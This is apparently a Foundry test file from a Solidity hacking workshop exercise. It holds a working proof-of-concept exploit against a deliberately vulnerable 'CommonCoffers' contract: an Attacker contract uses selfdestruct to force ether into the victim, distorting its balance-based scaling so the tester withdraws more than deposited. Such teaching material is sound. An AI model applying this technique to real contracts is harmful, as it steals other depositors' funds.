// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {CommonCoffers} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise9_CommonCoffers is Test {
    CommonCoffers public commonCoffers;
    Attacker public attacker;

    function setUp() public {
        commonCoffers = new CommonCoffers();
        attacker = new Attacker();
    }

    /**
     * Attacker can increase the balance of CommonCoffers
     * contract and make this equation incorrect and in favour of attacker -
     * uint toRemove = (scalingFactor * _amount) / address(this).balance;
     * by increasing the balance the scalingfactor will decrease on each withdraw and attacker
     * can withdraw more than expected tokens
     */
    function test_withdraw() public {
        address userA = vm.addr(1);
        address userB = vm.addr(2);
        vm.deal(userA, 2 ether);
        vm.deal(userB, 2 ether);
        vm.deal(address(this), 10 ether);

        vm.startPrank(userA);
        commonCoffers.deposit{value: 2 ether}(userA);
        vm.stopPrank();

        vm.startPrank(userB);
        commonCoffers.deposit{value: 2 ether}(userB);
        vm.stopPrank();
        console.log(commonCoffers.scalingFactor());

        commonCoffers.deposit{value: 2 ether}(address(this));

        attacker.attack{value: 8 ether}(address(commonCoffers));

        commonCoffers.withdraw(2000000000000000000);

        commonCoffers.withdraw(2000000000000000000);
    }

    fallback() external payable {}

    receive() external payable {}
}

contract Attacker {
    function attack(address _victim) external payable {
        selfdestruct(payable(_victim));
    }
}
